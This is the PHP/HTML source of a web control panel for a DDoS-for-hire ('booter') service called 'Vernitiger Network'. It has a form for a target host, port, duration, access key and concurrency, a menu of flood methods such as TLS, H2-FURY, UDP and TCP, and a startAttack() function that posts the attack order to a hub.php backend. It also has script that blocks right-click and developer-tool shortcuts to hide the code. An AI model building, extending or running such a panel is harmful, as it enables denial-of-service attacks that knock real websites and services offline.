<?php
header('X-Frame-Options: DENY');
header('X-Content-Type-Options: nosniff');
header("Content-Security-Policy: default-src 'self'; script-src 'self';");
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Vernitiger Network</title>
    <style>
        body {
            background-color: #0d1117;
            color: #c9d1d9;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            user-select: none;
            margin: 0;
        }
        .container {
            background-color: #161b22;
            padding: 30px;
            border-radius: 10px;
            width: 400px;
            box-shadow: 0 0 15px rgba(0,0,0,0.5);
        }
        h1 {
            text-align: center;
            color: #00bfff;
            margin: 0 0 20px;
        }
        input, select, button {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            background-color: #0d1117;
            border: 1px solid #30363d;
            color: #c9d1d9;
            border-radius: 5px;
            font-size: 14px;
            box-sizing: border-box;
        }
        button {
            background-color: #00bfff;
            border: none;
            color: white;
            font-weight: bold;
            cursor: pointer;
        }
        button:hover {
            background-color: #0080ff;
        }
        .attack-info {
            margin-top: 20px;
            background-color: #0d1117;
            padding: 15px;
            border: 1px solid #30363d;
            border-radius: 5px;
            font-size: 14px;
        }
    </style>
    <script>
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.onkeydown = function(e) {
            if (e.keyCode===123 || 
               (e.ctrlKey&&e.key.toUpperCase()==='U') ||
               (e.ctrlKey&&e.shiftKey&&['I','C','J'].includes(e.key.toUpperCase())))
                return false;
        };

        function startAttack() {
            document.getElementById('attackInfo').innerHTML = '🚀 Sending…';
            const data = {
                host: document.getElementById('host').value,
                port: document.getElementById('port').value,
                time: document.getElementById('time').value,
                method: document.getElementById('method').value,
                key: document.getElementById('key').value,
                concurrents: document.getElementById('concurrents').value
            };
            fetch('hub.php?action=startAttack', {
                method: 'POST',
                headers: {'Content-Type':'application/json'},
                body: JSON.stringify(data)
            })
            .then(r=>r.json())
            .then(res=>{
                document.getElementById('attackInfo').innerHTML = res.message;
            })
            .catch(()=>{
                document.getElementById('attackInfo').innerHTML = '❌ Error sending attack.';
            });
        }
    </script>
</head>
<body>
  <div class="container">
    <h1>Vernitiger Network</h1>
    <input type="text" id="host" placeholder="example.com">
    <input type="number" id="port" placeholder="443">
    <input type="number" id="time" placeholder="30">
    <input type="text" id="key" placeholder="user123key">
    <input type="number" id="concurrents" placeholder="1">
    <select id="method">
      <option value="TLS">TLS</option>
      <option value="VFLOOD">VFLOOD</option>
      <option value="MIXBILL">MIXBILL</option>
      <option value="HTTPS">HTTPS</option>
      <option value="H2-FURY">H2-FURY</option>
      <option value="H2-JOUMA">H2-JOUMA</option>
      <option value="VERN-B">VERN-B</option>
      <option value="H2-VERN">H2-VERN</option>
      <option value="BROWSER">BROWSER</option>
      <option value="UDP">UDP</option>
      <option value="TCP">TCP</option>
    </select>
    <button onclick="startAttack()">Confirm</button>
    <div class="attack-info" id="attackInfo"></div>
  </div>
</body>
</html>
